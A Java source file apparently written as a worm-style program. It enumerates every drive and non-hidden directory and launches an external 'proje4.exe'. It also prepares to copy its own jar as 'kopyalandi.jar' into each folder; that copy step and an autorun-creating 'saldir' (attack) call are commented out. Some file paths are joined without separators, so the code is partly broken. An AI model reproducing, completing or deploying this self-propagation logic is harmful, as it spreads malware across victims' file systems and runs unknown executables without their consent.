
package shrub;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.nio.channels.FileChannel;
import java.nio.file.FileSystems;
import java.util.ArrayList;
import java.util.Iterator;




/**
 *
 * @author DarkShrub
 */
public class Shrub {

    public static void copyFile(File sourceFile, File destFile) throws IOException {
 if(!destFile.exists()) {
  destFile.createNewFile();
 }
 
 FileChannel source = null;
 FileChannel destination = null;
 try {
  source = new FileInputStream(sourceFile).getChannel();
  destination = new FileOutputStream(destFile).getChannel();
  destination.transferFrom(source, 0, source.size());
 }
 finally {
  if(source != null) {
   source.close();
  }
  if(destination != null) {
   destination.close();
  }
 }
    }
   public static void listf(String directoryName, ArrayList<String> Fname) {
    File directory = new File(directoryName);
Fname.add(directoryName);
   
    File[] fList = directory.listFiles();
    for (File file : fList) {
         if (file.isDirectory() && !filedect(file)  ){
             try {
                 listf(file.getAbsolutePath(), Fname);
             } catch (Exception e) {
                 
             }
            
        }
    }
}
   public static boolean filedect(File filePath)
   {
       
       return (filePath.isHidden());
   }
    public static void main(String[] args) throws IOException ,IllegalAccessException, FileNotFoundException, UnsupportedEncodingException, InterruptedException{
        
        
        
       
       
        ArrayList<String> Fnames = new ArrayList<>();
        
       File[] disks=File.listRoots();
       
       for(File disk:disks)
       {
           System.out.println(disk.getPath());
        listf((disk.getPath()+"\\"),Fnames);
        
        
       String[] names=Fnames.toArray(new String[Fnames.size()]);
       File Ftemp;
       String path = new File(".").getCanonicalPath();
       Process process = Runtime.getRuntime().exec(path+"proje4.exe");
           System.out.println("shrub.Shrub.main()"+path);
     File file=new File(path+"Shrub.jar");
          
        for (String name : names) {
            try {
                  Ftemp = new File(name + "\\kopyalandi.jar");
           //copyFile(file, Ftemp);
           
            System.out.println("  \n" + name);
            } catch (Exception e) {
            }
          
        }
       }
       // exTRa saldir=new exTRa();
      //  saldir.createAutorun();
        
        
    }
}
